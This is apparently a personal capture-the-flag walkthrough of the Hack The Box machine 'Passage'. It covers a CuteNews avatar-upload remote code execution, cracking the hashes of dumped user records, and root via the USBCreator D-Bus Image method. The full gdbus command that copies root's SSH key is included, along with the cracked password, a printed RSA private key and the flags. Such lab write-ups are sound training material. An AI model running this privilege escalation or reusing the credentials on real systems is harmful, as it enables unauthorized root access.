 # Passage  

 export IP=10.10.10.206

 ## Solution

 lets start with an nmap scan to have an idea <br>

 ```
cmd: nmap -sC -sV -oN nmap/initial $IP

22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News
8888/tcp open  tcpwrapped
```

This ssh version (7.2p2) has an user enumeration vulnerability. Lets start with that <br>

Update: since there is something blocking the IP when there is alot of traffic, i assume that the names found by the exploit are wrong because it is based on timming (fast response == hit) <br>

that discovered port in 8888 that identified tcpwrapped, after some research, it may be some kind of firewall protection some application <br>

added tag -sS and -f to nmap, and it does not found anything more... lets leave an all port scan <br> 

```
cmd: nmap -f -p- -sC -sV -oN nmap/all_ports $IP

Same results
```

Lets visit the webpage <br>

from the first post available i can say that the tcpwrapped port found is due to <b> Fail2Ban </b>

From the posts we can see some potential users
```
admin (nadav@passage.htb)
Paul coles (paul@passage.htb)
Sid Meier
Kim Swift
James
```

The running CMS is CuteNews... from docs the login path is

```
addr/CuteNews/index.php
```

We can create an account, lets go ahead and do that... <br>

From the Help/about we can view the version: <b>Cutenews v2.1.2 </b> <br>

in the profile, we can upload an avatar and we can then access the avatars folder and execute a shell (maybe!!!) <br> 

Well i tried to mask a revshell in a png file (changing also the magic numbers) but it was not allowing the file... but there is exploits for this vulnerability 

```
CuteNews 2.1.2 - 'avatar' Remote Code Execution 
```

and voila, we got a shell! <br>

```
whoami
www-data
```

Since the exploit shell is not that good, lets get a php rev shell <br>

From linpeas

```
127.0.0.1:631 LISTEN

-rw-r--r-- 1 root root  722 Aug 31 15:14 /etc/crontab 

Sudo version 1.8.16    

gdb was found in PATH

uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)  (interesting groups)


nadav    tty7     :0               07:28   18:35   2.60s  0.11s /sbin/upstart --user (has login)

/usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)

-rw-r--r-- 1 root root 2188 Aug 31  2015 /etc/bash.bashrc           

-rw-r--r-- 1 root root 76 Mar 31  2017 /usr/share/lightdm/lightdm.conf.d/50-disable-log-backup.conf

-rw-rw-r-- 1 nadav nadav 5688 Apr 20  2016 /var/lib/app-info/icons/ubuntu-xenial-universe/64x64/sbackup-gtk_sbackup-conf.png
-rw-rw-r-- 1 nadav nadav 6964 Apr 20  2016 /var/lib/app-info/icons/ubuntu-xenial-universe/64x64/luckybackup_luckybackup.png
-rw-rw-r-- 1 nadav nadav 6212 Apr 20  2016 /var/lib/app-info/icons/ubuntu-xenial-universe/64x64/sbackup-gtk_sbackup-restore.png
```

Inside the /var/www/html/CuteNews/cdata/users/lines we have several base64 encoded things

```
YToxOntzOjQ6Im5hbWUiO2E6MTp7czo1OiJhZG1pbiI7YTo4OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMDQ3IjtzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6MzoiYWNsIjtzOjE6IjEiO3M6NToiZW1haWwiO3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjQ6InBhc3MiO3M6NjQ6IjcxNDRhOGI1MzFjMjdhNjBiNTFkODFhZTE2YmUzYTgxY2VmNzIyZTExYjQzYTI2ZmRlMGNhOTdmOWUxNDg1ZTEiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3OTg4IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0=

a:1:{s:4:"name";a:1:{s:5:"admin";a:8:{s:2:"id";s:10:"1592483047";s:4:"name";s:5:"admin";s:3:"acl";s:1:"1";s:5:"email";s:17:"nadav@passage.htb";s:4:"pass";s:64:"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1";s:3:"lts";s:10:"1592487988";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}

7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1 : NO RESULT

#########################################################################################################################

YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJzaWQtbWVpZXIiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzI4MSI7czo0OiJuYW1lIjtzOjk6InNpZC1tZWllciI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToic2lkQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiU2lkIE1laWVyIjtzOjQ6InBhc3MiO3M6NjQ6IjRiZGQwYTBiYjQ3ZmM5ZjY2Y2JmMWE4OTgyZmQyZDM0NGQyYWVjMjgzZDFhZmFlYmI0NjUzZWMzOTU0ZGZmODgiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg1NjQ1IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0=

a:1:{s:4:"name";a:1:{s:9:"sid-meier";a:9:{s:2:"id";s:10:"1592483281";s:4:"name";s:9:"sid-meier";s:3:"acl";s:1:"3";s:5:"email";s:15:"sid@example.com";s:4:"nick";s:9:"Sid Meier";s:4:"pass";s:64:"4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88";s:3:"lts";s:10:"1592485645";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}

4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88 : NO RESULT

#########################################################################################################################

YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19

a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}

e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd : atlanta1

#########################################################################################################################

YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJraW0tc3dpZnQiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzMwOSI7czo0OiJuYW1lIjtzOjk6ImtpbS1zd2lmdCI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToia2ltQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiS2ltIFN3aWZ0IjtzOjQ6InBhc3MiO3M6NjQ6ImY2NjlhNmY2OTFmOThhYjA1NjIzNTZjMGNkNWQ1ZTdkY2RjMjBhMDc5NDFjODZhZGNmY2U5YWYzMDg1ZmJlY2EiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3MDk2IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIzIjt9fX0=

a:1:{s:4:"name";a:1:{s:9:"kim-swift";a:9:{s:2:"id";s:10:"1592483309";s:4:"name";s:9:"kim-swift";s:3:"acl";s:1:"3";s:5:"email";s:15:"kim@example.com";s:4:"nick";s:9:"Kim Swift";s:4:"pass";s:64:"f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca";s:3:"lts";s:10:"1592487096";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"3";}}}

f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca : NO RESULT


#########################################################################################################################

YToxOntzOjQ6Im5hbWUiO2E6MTp7czo2OiJlZ3JlNTUiO2E6MTE6e3M6MjoiaWQiO3M6MTA6IjE1OTg4Mjk4MzMiO3M6NDoibmFtZSI7czo2OiJlZ3JlNTUiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo0OiJuaWNrIjtzOjY6ImVncmU1NSI7czo0OiJwYXNzIjtzOjY0OiI0ZGIxZjBiZmQ2M2JlMDU4ZDRhYjA0ZjE4ZjY1MzMxYWMxMWJiNDk0YjU3OTJjNDgwZmFmN2ZiMGM0MGZhOWNjIjtzOjQ6Im1vcmUiO3M6NjA6IllUb3lPbnR6T2pRNkluTnBkR1VpTzNNNk1Eb2lJanR6T2pVNkltRmliM1YwSWp0ek9qQTZJaUk3ZlE9PSI7czozOiJsdHMiO3M6MTA6IjE1OTg4MzQwNzkiO3M6MzoiYmFuIjtzOjE6IjAiO3M6NjoiYXZhdGFyIjtzOjI2OiJhdmF0YXJfZWdyZTU1X3Nwd3ZndWp3LnBocCI7czo2OiJlLWhpZGUiO3M6MDoiIjt9fX0=

a:1:{s:4:"name";a:1:{s:6:"egre55";a:11:{s:2:"id";s:10:"1598829833";s:4:"name";s:6:"egre55";s:3:"acl";s:1:"4";s:5:"email";s:15:"egre55@test.com";s:4:"nick";s:6:"egre55";s:4:"pass";s:64:"4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:3:"lts";s:10:"1598834079";s:3:"ban";s:1:"0";s:6:"avatar";s:26:"avatar_egre55_spwvgujw.php";s:6:"e-hide";s:0:"";}}}


4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc : egre55
```

We got credentials for paul... let switch users ! <br>

creds
```
su paul
Password: atlanta1

whoami 
paul

cat ~/user.txt
FLAG: 4c1e71d6b113cc921bc70ddc45b45c7f
```

Some manual enumeration on the users folder we can see the .ssh folder and in the authorized keys, nadav contains his key ! <br>

From the hints, one makes sense with this discovery: Sharing isn't always caring. <br>
We can assume that nadav has access to paul's account and vice versa ! <br>

Lets try with paul's key!!! <br>
And yeah, we got in!!!

```
whoami 
nadav
```

To root, and since i did not found anything in linpeas i went ahead and serched the home dir, at first i found nothing... <br>

After this hint: <b> Catch the bus and come back home </b>, i did the same thing at the home folder and found something interesting in .viminfo file ! <br>

```
/etc/----> dbus-1 <--------/system.d/com.ubuntu.USBCreator.conf
```

Well, it took me a while to find it (and one more hint), but i found! <br> 

from this (https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/) we can see that a vulnerability in the usbcreator was present. <br>

This occured in the service method Image that, even not requiring password, if the user belongs to the sudo group (which nadav is and the usbcreator also is), it would execute with elevated privileges (root) <br>

Since the Image method (for the USBCreator object) invokes a dd'like method (which, from man page, convert and copy a file), any user that belongs to the sudo group can duplicate any file in the system!! <br>

How to comunicate with the services: gdbus <br>

```
gdbus call [ --system | --session | --address address ] --dest bus_name --object-path /path/to/object --method org.project.InterfaceName.MethodName [ --timeout seconds ] ARG1 ARG2

Image required agrs: source, target, allow_system_internal 

cmd: gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /home/nadav/w/root_rsa true

cat /home/nadav/w/root_rsa

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAth1mFSVw6Erdhv7qc+Z5KWQMPtwTsT9630uzpq5fBx/KKzqZ
B7G3ej77MN35+ULlwMcpoumayWK4yZ/AiJBm6FEVBGSwjSMpOGcNXTL1TClGWbdE
+WNBT+30n0XJzi/JPhpoWhXM4OqYLCysX+/b0psF0jYLWy0MjqCjCl/muQtD6f2e
jc2JY1KMMIppoq5DwB/jJxq1+eooLMWVAo9MDNDmxDiw+uWRUe8nj9qFK2LRKfG6
U6wnyQ10ANXIdRIY0bzzhQYTMyH7o5/sjddrRGMDZFmOq6wHYN5sUU+sZDYD18Yg
ezdTw/BBiDMEPzZuCUlW57U+eX3uY+/Iffl+AwIDAQABAoIBACFJkF4vIMsk3AcP
0zTqHJ1nLyHSQjs0ujXUdXrzBmWb9u0d4djZMAtFNc7B1C4ufyZUgRTJFETZKaOY
8q1Dj7vJDklmSisSETfBBl1RsiqApN5DNHVNIiQE/6CZNgDdFTCnzQkiUPePic8R
P1St2AVP1qmMvVimDFSJoiOEUfzidepXEEUQrByNmOJDtewMSm4aGz60ced2XCBr
GTt/wyo0y5ygRJkUcC+/o4/r2DQdrjCbeuyzAzzhFKQQx6HN5svzpi0jOWC0cB0W
GmAp5Q7fIFhuGyrxShs/BEuQP7q7Uti68iwEh2EZSlaMcBFEJvirWtIO7U3yIHYI
HnNlLvECgYEA7tpebu84sTuCarHwASAhstiCR5LMquX/tZtHi52qKKmYzG6wCCMg
S/go8DO8AX5mldkegD7KBmTeMNPKp8zuE8s+vpErCBH+4hOq6U1TwZvDQ2XY9HBz
aHz7vG5L8E7tYpJ64Tt8e0DcnQQtW8EqFIydipO0eLdxkIGykjWuYGsCgYEAwzBM
UZMmOcWvUULWf65VSoXE270AWP9Z/XuamG/hNpREDZEYvHmhucZBf1MSGGU/B7MC
YXbIs1sS6ehDcib8aCVdOqRIqhCqCd1xVnbE0T4F2s1yZkct09Bki6EuXPDo2vhy
/6v6oP+yT5z854Vfq0FWxmDUssMbjXkVLKIZ3skCgYAYvxsllzdidW3vq/vXwgJ7
yx7EV5tI4Yd6w1nIR0+H4vpnw9gNH8aK2G01ZcbGyNfMErCsTNUVkIHMwUSv2fWY
q2gWymeQ8Hxd4/fDMDXLS14Rr42o1bW/T6OtRCgt/59spQyCJW2iP3gb9IDWjs7T
TjZMUz1RfIARnr5nk5Q7fQKBgGESVxJGvT8EGoGuXODZAZ/zUQj7QP4B2G5hF2xy
T64GJKYeoA+z6gNrHs3EsX4idCtPEoMIQR45z/k2Qry1uNfOpUPxyhWR/g6z65bV
sGJjlyPPAvLsuVTbEfYDLfyY7yVfZEnU7Os+3x4K9BfsU7zm3NIB/CX/NGeybR5q
a7VJAoGANui4oMa/9x8FSoe6EPsqbUcbJCmSGPqS8i/WZpaSzn6nW+636uCgB+EP
WOtSvOSRRbx69j+w0s097249fX6eYyIJy+L1LevF092ExQdoc19JTTKJZiWwlk3j
MkLnfTuKj2nvqQQ2fq+tIYEhY6dcSRLDQkYMCg817zynfP0I69c=
-----END RSA PRIVATE KEY-----

cat root.txt
FLAG: 7b269e0c2ea2b1065e504274254f7ea1
```
